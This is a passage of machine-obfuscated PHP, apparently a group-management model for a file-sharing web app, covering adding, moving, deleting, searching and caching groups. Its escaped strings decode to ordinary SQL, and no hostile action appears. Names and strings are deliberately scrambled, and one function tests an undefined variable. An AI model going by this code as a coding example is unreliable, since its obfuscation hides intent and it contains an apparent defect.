$this->cacheFunctionGet($_SERVER[ªÏ§Ë·][1939], $öóÖˆå¤); } protected function getInfoSimple($‹‡¶•ğ, $Àù”´¦« = false) { $ÒÒşÏè =& $_SERVER[ªÏ§Ë·]; if ($Àù”´¦«) { $Â¨“óÃ£ = array($ÒÒşÏè[1857] => intval($‹‡¶•ğ)); $Ä¿™Òïî = $this->where($Â¨“óÃ£)->find(); return is_array($Ä¿™Òïî) ? $Ä¿™Òïî : array(); } return $this->cacheFunctionGet($ÒÒşÏè[1940], $‹‡¶•ğ); } protected function groupAdd($Í¿ÌÅÍÏ) { $®â±İá¾ =& $_SERVER[ªÏ§Ë·]; if (!$Í¿ÌÅÍÏ[$®â±İá¾[470]] && isset($Í¿ÌÅÍÏ[$®â±İá¾[1857]]) && $Í¿ÌÅÍÏ[$®â±İá¾[1857]] == 1) { if ($šÊÒş² = $this->getInfoSimple($Í¿ÌÅÍÏ[$®â±İá¾[1857]], !0)) { return $Í¿ÌÅÍÏ[$®â±İá¾[1857]]; } } else { $šÊÒş² = $this->getInfoSimple($Í¿ÌÅÍÏ[$®â±İá¾[470]]); if (!$šÊÒş²) { return !1; } } $‘Í‰‰Ğ‡ = $®â±İá¾[559]; if ($šÊÒş²[$®â±İá¾[549]]) { $‘Í‰‰Ğ‡ = $šÊÒş²[$®â±İá¾[549]] . $šÊÒş²[$®â±İá¾[1857]] . $®â±İá¾[60]; } $ªÅöªë = array($®â±İá¾[458] => $this->groupNameAuto($Í¿ÌÅÍÏ[$®â±İá¾[470]], $Í¿ÌÅÍÏ[$®â±İá¾[42]]), $®â±İá¾[439] => $Í¿ÌÅÍÏ[$®â±İá¾[470]], $®â±İá¾[618] => $‘Í‰‰Ğ‡, $®â±İá¾[1941] => $Í¿ÌÅÍÏ[$®â±İá¾[1844]], $®â±İá¾[1942] => 0, $®â±İá¾[1861] => 0); if (isset($Í¿ÌÅÍÏ[$®â±İá¾[1881]])) { $ªÅöªë[$®â±İá¾[1881]] = $Í¿ÌÅÍÏ[$®â±İá¾[1881]]; } else { $×ÙÊÑì = $this->max($®â±İá¾[1881]); if (!$×ÙÊÑì) { $×ÙÊÑì = 0; } $ªÅöªë[$®â±İá¾[1881]] = $×ÙÊÑì + 1; } if (!empty($Í¿ÌÅÍÏ[$®â±İá¾[1857]])) { $ªÅöªë[$®â±İá¾[1857]] = $Í¿ÌÅÍÏ[$®â±İá¾[1857]]; } $°“­œ§ = $this->add($ªÅöªë); $this->setNamePinyin($°“­œ§, $ªÅöªë[$®â±İá¾[42]]); if (isset($Í¿ÌÅÍÏ[$®â±İá¾[1943]])) { $this->metaSet($°“­œ§, array($®â±İá¾[1943] => $Í¿ÌÅÍÏ[$®â±İá¾[1943]], $®â±İá¾[1944] => $Í¿ÌÅÍÏ[$®â±İá¾[1944]])); unset($Í¿ÌÅÍÏ[$®â±İá¾[1943]]); unset($Í¿ÌÅÍÏ[$®â±İá¾[1944]]); } Model($®â±İá¾[1358])->groupRootAdd($°“­œ§); $this->_clearCache($Í¿ÌÅÍÏ[$®â±İá¾[470]]); return $°“­œ§; } protected function groupEdit($Å¥¨¥èõ, $¨Ÿ†ÊË‚) { $ä³”¸…° =& $_SERVER[ªÏ§Ë·]; $ĞöÆêßÜ = $this->getInfoSimple($Å¥¨¥èõ); if (!$ĞöÆêßÜ) { return !1; } if (!empty($¨Ÿ†ÊË‚[$ä³”¸…°[470]])) { $¢Ş«öº = $this->getInfoSimple($¨Ÿ†ÊË‚[$ä³”¸…°[470]]); if (!$¢Ş«öº) { return !1; } if ($ĞöÆêßÜ[$ä³”¸…°[1857]] == $¢Ş«öº[$ä³”¸…°[1857]]) { return !1; } if ($¨Ÿ†ÊË‚[$ä³”¸…°[470]] != $ĞöÆêßÜ[$ä³”¸…°[470]]) { if ($¢Ş«öº[$ä³”¸…°[549]] !== $ĞöÆêßÜ[$ä³”¸…°[549]] && strpos($¢Ş«öº[$ä³”¸…°[549]], $ĞöÆêßÜ[$ä³”¸…°[549]] . $ĞöÆêßÜ[$ä³”¸…°[1857]] . $ä³”¸…°[60]) === 0) { return !1; } $¨Ÿ†ÊË‚[$ä³”¸…°[618]] = $¢Ş«öº[$ä³”¸…°[549]] . $¨Ÿ†ÊË‚[$ä³”¸…°[470]] . $ä³”¸…°[60]; $this->_changeChildLevel($ĞöÆêßÜ, $¢Ş«öº); $this->_clearCache($¢Ş«öº[$ä³”¸…°[1857]]); $this->_clearCache($ĞöÆêßÜ[$ä³”¸…°[470]]); } } if (isset($¨Ÿ†ÊË‚[$ä³”¸…°[42]])) { $this->setNamePinyin($Å¥¨¥èõ, $¨Ÿ†ÊË‚[$ä³”¸…°[42]]); } if (isset($¨Ÿ†ÊË‚[$ä³”¸…°[1943]])) { $this->metaSet($Å¥¨¥èõ, array($ä³”¸…°[1943] => $¨Ÿ†ÊË‚[$ä³”¸…°[1943]], $ä³”¸…°[1944] => $¨Ÿ†ÊË‚[$ä³”¸…°[1944]])); unset($¨Ÿ†ÊË‚[$ä³”¸…°[1943]]); unset($¨Ÿ†ÊË‚[$ä³”¸…°[1944]]); } $this->_clearChildrenCache($ĞöÆêßÜ); return $this->where(array($ä³”¸…°[1945] => $Å¥¨¥èõ))->save($¨Ÿ†ÊË‚); } private function _clearChildrenCache($’·øâŸØ) { $ÑÉéÖü¯ =& $_SERVER[ªÏ§Ë·]; $Ú›±ò‚ï = array($ÑÉéÖü¯[618] => array($ÑÉéÖü¯[578], $’·øâŸØ[$ÑÉéÖü¯[549]] . $’·øâŸØ[$ÑÉéÖü¯[1857]] . $ÑÉéÖü¯[579])); $¯Şôæ¦Š = $this->field($ÑÉéÖü¯[1857])->where($Ú›±ò‚ï)->select(); foreach ($¯Şôæ¦Š as $â ä£•Ÿ) { $this->_clearCache($â ä£•Ÿ[$ÑÉéÖü¯[1857]]); } } private function _clearCache($§µ¹Å„) { $ôÉŒüû¹ =& $_SERVER[ªÏ§Ë·]; $this->cacheFunctionClear($ôÉŒüû¹[1939], $§µ¹Å„); $this->cacheFunctionClear($ôÉŒüû¹[1940], $§µ¹Å„); } private function _changeChildLevel($ŒÀ•æşÅ, $æ€¢É»æ, $Ô´ÂÓÛ« = false) { $‹×•£ =& $_SERVER[ªÏ§Ë·]; $ŒÄë¤‡Ù = $ŒÀ•æşÅ[$‹×•£[549]] . $ŒÀ•æşÅ[$‹×•£[1857]] . $‹×•£[60]; $Œ™¿íÚÃ = $æ€¢É»æ[$‹×•£[549]] . $æ€¢É»æ[$‹×•£[1857]] . $‹×•£[60] . $ŒÀ•æşÅ[$‹×•£[1857]] . $‹×•£[60]; if ($Ô´ÂÓÛ«) { $Œ™¿íÚÃ = $æ€¢É»æ[$‹×•£[549]] . $æ€¢É»æ[$‹×•£[1857]] . $‹×•£[60]; } $ĞÄ‡éÍˆ = array($‹×•£[618] => array($‹×•£[578], $ŒÀ•æşÅ[$‹×•£[549]] . $ŒÀ•æşÅ[$‹×•£[1857]] . $‹×•£[579])); $Û¬—±õ = array($‹×•£[618] => array($‹×•£[627], "\x72\x65\160\x6c\141\x63\145\50\x70\141\x72\145\x6e\x74\114\145\x76\x65\154\54\x27{$ŒÄë¤‡Ù}\47\54\x27{$Œ™¿íÚÃ}\47\x29")); $this->_clearChildrenCache($ŒÀ•æşÅ); $this->where($ĞÄ‡éÍˆ)->data($Û¬—±õ)->save(); } public function setNamePinyin($¿§ÖçÌ÷, $Ãş…ÃËº = false) { $»ô‘ã«Ÿ =& $_SERVER[ªÏ§Ë·]; if (!$Ãş…ÃËº) { $¨ìçÌ¯ = $this->getInfoSimple($¿§ÖçÌ÷); $Ãş…ÃËº = $¨ìçÌ¯[$»ô‘ã«Ÿ[42]]; } if (!Input::check($Ãş…ÃËº, $»ô‘ã«Ÿ[621])) { $this->metaSet($¿§ÖçÌ÷, $»ô‘ã«Ÿ[503], null); $this->metaSet($¿§ÖçÌ÷, $»ô‘ã«Ÿ[502], null); return; } $œ°á‘€ = array($»ô‘ã«Ÿ[503] => str_replace($»ô‘ã«Ÿ[63], $»ô‘ã«Ÿ[12], Pinyin::get($Ãş…ÃËº)), $»ô‘ã«Ÿ[502] => Pinyin::get($Ãş…ÃËº, $»ô‘ã«Ÿ[622])); $this->metaSet($¿§ÖçÌ÷, $œ°á‘€); } protected function groupStatus($¼©Ë™öÊ, $É‹°•øø) { $¢•ÚŞ›× =& $_SERVER[ªÏ§Ë·]; $µÑò¥•å = $this->getInfoSimple($¼©Ë™öÊ); if (!$µÑò¥•å) { return !1; } if ($É‹°•øø == $¢•ÚŞ›×[98]) { $ĞÕ¨Á¥‡ = $this->parentLevelArray($µÑò¥•å[$¢•ÚŞ›×[549]]); } else { $¡é¼Ì• = array($¢•ÚŞ›×[618] => array($¢•ÚŞ›×[578], $µÑò¥•å[$¢•ÚŞ›×[549]] . $µÑò¥•å[$¢•ÚŞ›×[1857]] . $¢•ÚŞ›×[579])); $ĞÕ¨Á¥‡ = $this->where($¡é¼Ì•)->field($¢•ÚŞ›×[1857])->select(); $ĞÕ¨Á¥‡ = array_to_keyvalue($ĞÕ¨Á¥‡, $¢•ÚŞ›×[12], $¢•ÚŞ›×[1857]); } $ĞÕ¨Á¥‡[] = $µÑò¥•å[$¢•ÚŞ›×[1857]]; $·„¶İï‚ = array(); foreach ($ĞÕ¨Á¥‡ as $¼©Ë™öÊ) { $·„¶İï‚[] = array($¢•ÚŞ›×[1857] => $¼©Ë™öÊ, $¢•ÚŞ›×[104] => $¢•ÚŞ›×[778], $¢•ÚŞ›×[412] => $É‹°•øø); $this->_clearCache($¼©Ë™öÊ); } return Model($¢•ÚŞ›×[1946])->addAll($·„¶İï‚, array(), !0); } protected function groupRemove($Àœô¬®Ÿ, $¨¥Ÿµœ = false) { $‡²ş‡–¼ =& $_SERVER[ªÏ§Ë·]; $„Ää§Ü« = array($‡²ş‡–¼[1857] => $Àœô¬®Ÿ); $Ÿ«À‰¸Ù = $this->where($„Ää§Ü«)->find(); if (!$Ÿ«À‰¸Ù || $Ÿ«À‰¸Ù[$‡²ş‡–¼[470]] == 0) { return !1; } if (!$¨¥Ÿµœ) { $û‡«¡Ğ = $this->getInfoSimple($Ÿ«À‰¸Ù[$‡²ş‡–¼[470]]); $this->_changeChildLevel($Ÿ«À‰¸Ù, $û‡«¡Ğ, !0); $this->where(array($‡²ş‡–¼[470] => $Àœô¬®Ÿ))->save(array($‡²ş‡–¼[470] => $Ÿ«À‰¸Ù[$‡²ş‡–¼[470]])); $this->_clearCache($û‡«¡Ğ[$‡²ş‡–¼[1857]]); } Model($‡²ş‡–¼[1946])->where($„Ää§Ü«)->delete(); Model($‡²ş‡–¼[1947])->where($„Ää§Ü«)->delete(); Model($‡²ş‡–¼[853])->groupRootRemove($Àœô¬®Ÿ); $this->_clearCache($Ÿ«À‰¸Ù[$‡²ş‡–¼[470]]); return $this->where($„Ää§Ü«)->delete(); } protected function groupSort($ƒÑ÷†ˆ“) { $›Å‘õº× =& $_SERVER[ªÏ§Ë·]; $†®µà’É = array(); foreach ($ƒÑ÷†ˆ“ as $ùòãâ‹ => $¦ÑÅÌç) { $†®µà’É[] = array($›Å‘õº×[1857], $¦ÑÅÌç, $›Å‘õº×[1881], $ùòãâ‹ + 1); } $this->saveAll($†®µà’É); } public function listData() { $„–×Äƒ£ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($„–×Äƒ£[$_SERVER[ªÏ§Ë·][407]]); return $„–×Äƒ£; } private function _makeOrder($í×ØÖÔØ = '') { $æùÔïº† =& $_SERVER[ªÏ§Ë·]; $„‘çÜ³à = array($æùÔïº†[1857], $æùÔïº†[42], $æùÔïº†[1846], $æùÔïº†[211]); $ÉË³ùÛì = array($æùÔïº†[488] => $æùÔïº†[489], $æùÔïº†[490] => $æùÔïº†[491]); $¤µ—·Ğ¾ = Input::get($æùÔïº†[495], $æùÔïº†[7], $æùÔïº†[1861], $„‘çÜ³à); $åÒ²«ÉÕ = Input::get($æùÔïº†[496], $æùÔïº†[7], $æùÔïº†[1948], array($æùÔïº†[1948], $æùÔïº†[490])); $åÒ²«ÉÕ = $ÉË³ùÛì[$åÒ²«ÉÕ]; $í×ØÖÔØ = $í×ØÖÔØ . "{$¤µ—·Ğ¾}\x20{$åÒ²«ÉÕ}\54\x20\147\162\157\165\160\x49\104\x20\141\x73\143"; return $this->order($í×ØÖÔØ); } public function listChild($õ˜©Ì‹Ñ) { $¡»›Ñ©ç =& $_SERVER[ªÏ§Ë·]; $ë£‘˜ = $this->where(array($¡»›Ñ©ç[470] => $õ˜©Ì‹Ñ))->_makeOrder()->selectPage(200); $this->_listDataApply($ë£‘˜[$¡»›Ñ©ç[407]]); return $ë£‘˜; } public function listChildIds($›Ó™ı) { $…ºïÊÕ =& $_SERVER[ªÏ§Ë·]; if (is_string($‚ùê£æİ)) { $›Ó™ı = explode($…ºïÊÕ[60], $›Ó™ı); } $•¤¥É¬Ó = $this->where(array($…ºïÊÕ[1857] => array($…ºïÊÕ[7], $›Ó™ı)))->field($…ºïÊÕ[1949])->select(); if (!$•¤¥É¬Ó) { return !1; } $Á¬‰Âí = array(); foreach ($•¤¥É¬Ó as $²Öõ«ÍÙ) { $Á¬‰Âí[] = "\x73\145\x6c\145\143\x74\40\147\162\157\165\x70\111\x44\40\146\x72\x6f\155\40\140\147\x72\157\x75\160\140\x20\x77\150\145\x72\145\40\x70\141\x72\x65\156\x74\x4c\x65\166\x65\154\x20\154\151\153\145\40\x27{$²Öõ«ÍÙ[$…ºïÊÕ[549]]}{$²Öõ«ÍÙ[$…ºïÊÕ[1857]]}\x2c\x25\47"; } $Á¬‰Âí = implode($…ºïÊÕ[1950], $Á¬‰Âí); $•¤¥É¬Ó = $this->query($Á¬‰Âí); if (!$•¤¥É¬Ó) { return array(); } $›Ó™ı = array_to_keyvalue($•¤¥É¬Ó, $…ºïÊÕ[12], $…ºïÊÕ[1857]); return array_unique($›Ó™ı); } public function listByID($Ö·¡›”) { $ñìÙû—ì =& $_SERVER[ªÏ§Ë·]; if (!$Ö·¡›”) { return array(); } $¿Ş¾ÕŒ£ = array($ñìÙû—ì[1857] => array($ñìÙû—ì[7], $Ö·¡›”)); $Š¿î­¢ = $this->where($¿Ş¾ÕŒ£)->select(); $Š¿î­¢ = array_sort_keep($Š¿î­¢, $ñìÙû—ì[1857], $Ö·¡›”); $this->_listDataApply($Š¿î­¢); return $Š¿î­¢; } public function listSearch($ Ÿ³…·ß) { $—…øŞ» =& $_SERVER[ªÏ§Ë·]; $şª§×Ÿ¹ = $ Ÿ³…·ß[$—…øŞ»[1951]]; $¦©õ«‹Î = isset($ Ÿ³…·ß[$—…øŞ»[1952]]) ? $ Ÿ³…·ß[$—…øŞ»[1952]] : !1; if (!trim($şª§×Ÿ¹)) { return !1; } $şª§×Ÿ¹ = str_replace($—…øŞ»[1953], $—…øŞ»[1954], $şª§×Ÿ¹); $Æ×Š£ß± = array($—…øŞ»[1857] => array($—…øŞ»[421], "{$şª§×Ÿ¹}\45"), $—…øŞ»[42] => array($—…øŞ»[421], "\x25{$şª§×Ÿ¹}\45"), $—…øŞ»[1025] => $—…øŞ»[1955]); if ($¦©õ«‹Î) { $¡“úĞËÆ = $this->getInfoSimple($¦©õ«‹Î); $–ĞÃÁà® = $¡“úĞËÆ[$—…øŞ»[549]] . $¦©õ«‹Î . $—…øŞ»[579]; $Æ×Š£ß± = array($Æ×Š£ß±, array($—…øŞ»[549] => array($—…øŞ»[421], $–ĞÃÁà®))); } $Æ×Š£ß± = $this->parseWhereLike($Æ×Š£ß±); $‡ŠæÖø‰ = $this->_makeOrder()->where($Æ×Š£ß±)->selectPage(20); $‡ŠæÖø‰ = $‡ŠæÖø‰ ? $‡ŠæÖø‰ : array($—…øŞ»[407] => array(), $—…øŞ»[404] => array()); if (!$‡ŠæÖø‰ || count($‡ŠæÖø‰[$—…øŞ»[407]]) < 5 && Input::check($şª§×Ÿ¹, $—…øŞ»[356])) { $õµÉÀì’ = $this->groupChildrenAll($¦©õ«‹Î); $†ğïì•© = $this->_searchFromMeta($—…øŞ»[502], $şª§×Ÿ¹, 10, $õµÉÀì’); $ˆ§¾§†Ü = $this->_searchFromMeta($—…øŞ»[503], $şª§×Ÿ¹, 10, $õµÉÀì’); $ËÍ¾¶ñ¶ = array_merge($†ğïì•©, $ˆ§¾§†Ü, $‡ŠæÖø‰[$—…øŞ»[407]]); $‡ŠæÖø‰[$—…øŞ»[407]] = array_unique_by_key($ËÍ¾¶ñ¶, $—…øŞ»[1857]); $‡ŠæÖø‰[$—…øŞ»[404]][$—…øŞ»[405]] = count($‡ŠæÖø‰[$—…øŞ»[407]]); $‡ŠæÖø‰[$—…øŞ»[404]][$—…øŞ»[406]] = ceil($‡ŠæÖø‰[$—…øŞ»[404]][$—…øŞ»[405]] / $‡ŠæÖø‰[$—…øŞ»[404]][$—…øŞ»[401]]); } $this->_listDataApply($‡ŠæÖø‰[$—…øŞ»[407]]); return $‡ŠæÖø‰; } protected function groupChildrenAll($×»„§¤‹) { $†­³ïá— =& $_SERVER[ªÏ§Ë·]; if (!$×»„§¤‹) { return !1; } if (is_string($×»„§¤‹)) { $×»„§¤‹ = array($×»„§¤‹); } $Å¯Ú²Şû = $×»„§¤‹; foreach ($×»„§¤‹ as $ĞÒËñÓé) { $²íĞìÍÕ = $this->getInfoSimple($ĞÒËñÓé); $ş›Ÿ–ÈÔ = array($†­³ïá—[549] => array($†­³ïá—[421], $²íĞìÍÕ[$†­³ïá—[549]] . $ĞÒËñÓé . $†­³ïá—[579])); $Ì¼îé„Œ = $this->field($†­³ïá—[1857])->where($ş›Ÿ–ÈÔ)->select(); $Å¯Ú²Şû = array_merge($Å¯Ú²Şû, array_to_keyvalue($Ì¼îé„Œ, $†­³ïá—[12], $†­³ïá—[1857])); } return array_unique($Å¯Ú²Şû); } private function _searchFromMeta($‡š—ûËİ, $ŞŒ…åß–, $Ï€û„Ş›, $âå´’Àù) { $Ïí±—š =& $_SERVER[ªÏ§Ë·]; $ŞŒ…åß– = strtolower($ŞŒ…åß–); $¢§‹–² = array($Ïí±—š[104] => $‡š—ûËİ, $Ïí±—š[412] => array($Ïí±—š[421], "\45{$ŞŒ…åß–}\45")); $¢§‹–² = $this->parseWhereLike($¢§‹–²); if ($âå´’Àù) { $¢§‹–²[$Ïí±—š[1857]] = array($Ïí±—š[7], $âå´’Àù); } $®†•áÌ¦ = Model($Ïí±—š[1956])->where($¢§‹–²)->limit($Ï€û„Ş›)->select(); if (!$®†•áÌ¦) { return array(); } $®†•áÌ¦ = array_to_keyvalue($®†•áÌ¦, $Ïí±—š[12], $Ïí±—š[1857]); $¬êœëş½ = $this->where(array($Ïí±—š[1945] => array($Ïí±—š[7], $®†•áÌ¦)))->select(); if (!$¬êœëş½) { return array(); } return $¬êœëş½; } protected function _listDataApplyItem($ˆ¯ï¨é) { $ÕÀİçâí = array($ˆ¯ï¨é); $this->_listDataApply($ÕÀİçâí); return $ÕÀİçâí[0]; } protected function _listDataApply(&$ŠÅÕ„Õô) { $ÁÍÚÜ­¸ =& $_SERVER[ªÏ§Ë·]; if (!$ŠÅÕ„Õô) { return; } $ÎşèÆğ = array_to_keyvalue($ŠÅÕ„Õô, $ÁÍÚÜ­¸[12], $ÁÍÚÜ­¸[1857]); $this->_listAppendChildren($ŠÅÕ„Õô); $this->_listAppendChildrenMember($ŠÅÕ„Õô); $this->_listAppendMeta($ŠÅÕ„Õô, $ÎşèÆğ); $this->_listAppendParent($ŠÅÕ„Õô); $this->_listAppendSourceRoot($ŠÅÕ„Õô, $ÎşèÆğ); } private function _listAppendChildren(&$‰ÜİŸ•Ì) { $©Î¹ÂÌî =& $_SERVER[ªÏ§Ë·]; $ê„øõ = array_to_keyvalue($‰ÜİŸ•Ì, $©Î¹ÂÌî[12], $©Î¹ÂÌî[1857]); $ùàˆıµŸ = array($©Î¹ÂÌî[470] => array($©Î¹ÂÌî[7], $ê„øõ)); $İãáÍ¢³ = array($©Î¹ÂÌî[470], $©Î¹ÂÌî[1957] => $©Î¹ÂÌî[529]); $»ûûÄÖÎ = $this->field($İãáÍ¢³)->where($ùàˆıµŸ)->group($©Î¹ÂÌî[470])->select(); $ú«­í­› = array_to_keyvalue($»ûûÄÖÎ, $©Î¹ÂÌî[470], $©Î¹ÂÌî[529]); foreach ($‰ÜİŸ•Ì as &$ãÕò²©–) { $…´ªáÃ· = $ãÕò²©–[$©Î¹ÂÌî[1857]]; $ãÕò²©–[$©Î¹ÂÌî[1958]] = isset($ú«­í­›[$…´ªáÃ·]) ? intval($ú«­í­›[$…´ªáÃ·]) : !1; } unset($ãÕò²©–); } private function _listAppendChildrenMember(&$ııê’µÂ) { $¨’àùø¨ =& $_SERVER[ªÏ§Ë·]; $ášÇÏšû = array_to_keyvalue($ııê’µÂ, $¨’àùø¨[12], $¨’àùø¨[1857]); $òø©¹ø– = array($¨’àùø¨[1857] => array($¨’àùø¨[7], $ášÇÏšû)); $Á–ˆ’´ = array($¨’àùø¨[1857], $¨’àùø¨[1957] => $¨’àùø¨[529]); $ôî¿¥ñ = Model($¨’àùø¨[1947])->field($Á–ˆ’´)->where($òø©¹ø–)->group($¨’àùø¨[1857])->select(); $å÷ö‹Ï– = array_to_keyvalue($ôî¿¥ñ, $¨’àùø¨[1857], $¨’àùø¨[529]); foreach ($ııê’µÂ as &$ı´“âÄÈ) { $¹ØÕéÀ¤ = $ı´“âÄÈ[$¨’àùø¨[1857]]; $ı´“âÄÈ[$¨’àùø¨[1959]] = isset($å÷ö‹Ï–[$¹ØÕéÀ¤]) ? intval($å÷ö‹Ï–[$¹ØÕéÀ¤]) : !1; } unset($ı´“âÄÈ); } private function _listAppendMeta(&$‹úßõŸ, $ıªç¿’ğ) { $ƒÅİíÚ¬ =& $_SERVER[ªÏ§Ë·]; $¬­±úÍ• = array($ƒÅİíÚ¬[1857] => array($ƒÅİíÚ¬[7], $ıªç¿’ğ)); $Âóƒóä® = Model($ƒÅİíÚ¬[1946])->where($¬­±úÍ•)->select(); $Âóƒóä® = array_to_keyvalue_group($Âóƒóä®, $ƒÅİíÚ¬[1857]); foreach ($Âóƒóä® as &$Ş÷Ó’¤) { $Ş÷Ó’¤ = array_to_keyvalue($Ş÷Ó’¤, $ƒÅİíÚ¬[104], $ƒÅİíÚ¬[412]); } unset($Ş÷Ó’¤); foreach ($‹úßõŸ as &$¥áÕ¬—õ) { $¥áÕ¬—õ[$ƒÅİíÚ¬[504]] = array(); if (isset($Âóƒóä®[$¥áÕ¬—õ[$ƒÅİíÚ¬[1857]]])) { $¥áÕ¬—õ[$ƒÅİíÚ¬[504]] = $Âóƒóä®[$¥áÕ¬—õ[$ƒÅİíÚ¬[1857]]]; } } unset($¥áÕ¬—õ); } protected function parentLevelArray($‹›¡†éÕ) { $Ó¡òæ«¾ =& $_SERVER[ªÏ§Ë·]; $‹›¡†éÕ = explode($Ó¡òæ«¾[60], trim($‹›¡†éÕ, $Ó¡òæ«¾[60])); $‹›¡†éÕ = array_remove_value($‹›¡†éÕ, $Ó¡òæ«¾[208]); return $‹›¡†éÕ; } protected function parentInGroup($óä¤‹Ÿ¶, $ÓÄ§è£¤) { $÷ö–Ç‡ã =& $_SERVER[ªÏ§Ë·]; $¸º ßÇô = $this->getInfoSimple($óä¤‹Ÿ¶); if (!$¸º ßÇô) { return !0; } $Ãú±åıŸ = $this->parentLevelArray($¸º ßÇô[$÷ö–Ç‡ã[549]]); $Ãú±åıŸ[] = $óä¤‹Ÿ¶; foreach ($Ãú±åıŸ as $óä¤‹Ÿ¶) { if (in_array($óä¤‹Ÿ¶ . $÷ö–Ç‡ã[12], $ÓÄ§è£¤)) { return !0; } } return !1; } private function _listAppendParent(&$Ù©İ–) { $¹öóáÂş =& $_SERVER[ªÏ§Ë·]; $‚„™“¥Œ = array(); foreach ($Ù©İ– as &$ÆóÑõ‰Ò) { $‚„™“¥Œ[$ÆóÑõ‰Ò[$¹öóáÂş[1857]]] = $ÆóÑõ‰Ò[$¹öóáÂş[42]]; $ÆÌëê¨ = $this->parentLevelArray($ÆóÑõ‰Ò[$¹öóáÂş[549]]); foreach ($ÆÌëê¨ as $•²–Ë) { if (!isset($‚„™“¥Œ[$•²–Ë])) { $‚„™“¥Œ[$•²–Ë] = 0; } } } unset($ÆóÑõ‰Ò); foreach ($‚„™“¥Œ as $šÄñÓ»º => $¦šÓƒüµ) { if ($¦šÓƒüµ) { continue; } $ó¼ÈÔ˜Á = $this->getInfoSimple($šÄñÓ»º); $‚„™“¥Œ[$šÄñÓ»º] = $ó¼ÈÔ˜Á[$¹öóáÂş[42]]; } $¢Ññ€ñ = $GLOBALS[$¹öóáÂş[6]][$¹öóáÂş[99]][$¹öóáÂş[1960]]; if ($GLOBALS[$¹öóáÂş[532]] == $¹öóáÂş[98]) { $¢Ññ€ñ = !1; } foreach ($Ù©İ– as &$ÆóÑõ‰Ò) { $ÆÌëê¨ = $this->parentLevelArray($ÆóÑõ‰Ò[$¹öóáÂş[549]]); $†ó‚©…ş = $¹öóáÂş[12]; foreach ($ÆÌëê¨ as $šÄñÓ»º => $•²–Ë) { if ($¢Ññ€ñ && $šÄñÓ»º == 0) { continue; } $†ó‚©…ş .= $‚„™“¥Œ[$•²–Ë] . $¹öóáÂş[8]; } if ($ÆÌëê¨) { $†ó‚©…ş .= $ÆóÑõ‰Ò[$¹öóáÂş[42]]; } $ÆóÑõ‰Ò[$¹öóáÂş[554]] = str_replace($¹öóáÂş[557], $¹öóáÂş[8], $†ó‚©…ş); } unset($ÆóÑõ‰Ò); } private function _listAppendSourceRoot(&$ŞÂ Ëòû, $ ‹°Š¿) { $®é®ßÀ¾ =& $_SERVER[ªÏ§Ë·]; $‘÷³°Õì = Model($®é®ßÀ¾[853])->listSourceRoot(SourceModel::TYPE_GROUP, $ ‹°Š¿); $‘÷³°Õì = array_to_keyvalue($‘÷³°Õì, $®é®ßÀ¾[534]); $‘÷³°Õì = array_remove_key($‘÷³°Õì, $®é®ßÀ¾[534]); foreach ($ŞÂ Ëòû as &$é¬ëÛ) { $é¬ëÛ[$®é®ßÀ¾[97]] = $‘÷³°Õì[$é¬ëÛ[$®é®ßÀ¾[1857]]] ? $‘÷³°Õì[$é¬ëÛ[$®é®ßÀ¾[1857]]] : array(); } unset($é¬ëÛ); } protected function groupMerge($ùûêÌÀş) { $ùûêÌÀş = array_values(array_unique($ùûêÌÀş)); $ö¢âõî = array(); for ($ëƒğ²ÊØ = 0; $ëƒğ²ÊØ < count($ùûêÌÀş); $ëƒğ²ÊØ++) { $ëÖ¯ã¦ = !1; for ($„Ìï¾Ë = 0; $„Ìï¾Ë < count($ùûêÌÀş); $„Ìï¾Ë++) { if ($ëƒğ²ÊØ == $„Ìï¾Ë) { continue; } if ($this->isParentOf($ùûêÌÀş[$„Ìï¾Ë], $ùûêÌÀş[$ëƒğ²ÊØ])) { $ëÖ¯ã¦ = !0; break; } } if (!$ëÖ¯ã¦) { $ö¢âõî[] = $ùûêÌÀş[$ëƒğ²ÊØ]; } } return $ö¢âõî; } protected function isParentOf($³”Òşš¯, $¼ÛŸ‚¦‘) { $üÒã°ñ¹ =& $_SERVER[ªÏ§Ë·]; if (!$³”Òşš¯ || !$¼ÛŸ‚¦‘ || $³”Òşš¯ == $¼ÛŸ‚¦‘) { return !1; } $–†áóôæ = $this->getInfoSimple($³”Òşš¯); $´‘°Ò¹Á = $this->getInfoSimple($¼ÛŸ‚¦‘); $¨ê¶ï = $–†áóôæ[$üÒã°ñ¹[549]] . $³”Òşš¯ . $üÒã°ñ¹[60]; if (substr($´‘°Ò¹Á[$üÒã°ñ¹[549]], 0, strlen($¨ê¶ï)) == $¨ê¶ï) { return !0; } return !1; } public function groupShowRoot($Îõ…Õì„, $”ç‡ŸÃ = false) { $ûÖá˜ÉÒ =& $_SERVER[ªÏ§Ë·]; $‰ùúõšœ = $this->getInfo($Îõ…Õì„); if (!$‰ùúõšœ) { return array(); } $×Ÿ ™« = $this->parentLevelArray($‰ùúõšœ[$ûÖá˜ÉÒ[549]]); $¹©Í” ú = array($Îõ…Õì„); if (count($×Ÿ ™«) == 0) { return $¹©Í” ú; } if ($”ç‡ŸÃ && count($×Ÿ ™«) == 1) { return $¹©Í” ú; } if (!$‰ùúõšœ[$ûÖá˜ÉÒ[504]] || !isset($‰ùúõšœ[$ûÖá˜ÉÒ[504]][$ûÖá˜ÉÒ[1943]]) || $‰ùúõšœ[$ûÖá˜ÉÒ[504]][$ûÖá˜ÉÒ[1943]] == $ûÖá˜ÉÒ[1912]) { return $this->groupShowRoot($×Ÿ ™«[count($×Ÿ ™«) - 1], $”ç‡ŸÃ); } if ($‰ùúõšœ[$ûÖá˜ÉÒ[504]][$ûÖá˜ÉÒ[1943]] == $ûÖá˜ÉÒ[395]) { $é×ïí¥ = explode($ûÖá˜ÉÒ[60], $‰ùúõšœ[$ûÖá˜ÉÒ[504]][$ûÖá˜ÉÒ[1944]]); if ($é×ïí¥) { $¹©Í” ú = array_merge($¹©Í” ú, $é×ïí¥); } } return $¹©Í” ú; } protected function resetParentLevel() { $ÊŸ¬ôÚÈ =& $_SERVER[ªÏ§Ë·]; $»•·€åñ = $ÊŸ¬ôÚÈ[1857]; $Ü–Ïºı = $this->select(); $Ü–Ïºı = array_to_keyvalue($Ü–Ïºı, $»•·€åñ); foreach ($Ü–Ïºı as $²‚ò) { $ÇîÏ©ì = $²‚ò; $¹É¶ÊÃ¦ = array(); while ($ÇîÏ©ì[$ÊŸ¬ôÚÈ[470]] != 0) { $¹É¶ÊÃ¦[] = $ÇîÏ©ì[$ÊŸ¬ôÚÈ[470]]; $ÇîÏ©ì = 